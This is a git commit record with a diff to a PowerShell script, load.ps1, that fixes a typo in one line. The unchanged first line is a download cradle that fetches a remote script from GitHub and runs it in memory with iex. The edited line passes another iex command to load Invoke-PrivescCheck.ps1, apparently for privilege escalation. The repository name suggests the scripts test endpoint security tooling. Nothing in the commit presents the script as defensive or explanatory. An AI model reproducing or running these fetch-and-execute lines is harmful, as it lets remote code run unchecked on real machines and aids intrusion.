bb0925b67250456f2d9a70faac43da1689b78d53
St3v3a <steve.atco@gmail.com>
2021-02-08 11:16:52 +0000

    Update load.ps1

--- load.ps1
+++ load.ps1
@@ -1,2 +1,2 @@
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/St3v3a/falcontest/master/RunSec.ps1')
-Get-UserPrivileges -argument " -c iex(https://github.com/St3v3a/falcontest/blob/master/Invoke-PrivescCheck.ps11')"
+Get-UserPrivileges -argument " -c iex(https://github.com/St3v3a/falcontest/blob/master/Invoke-PrivescCheck.ps1')"
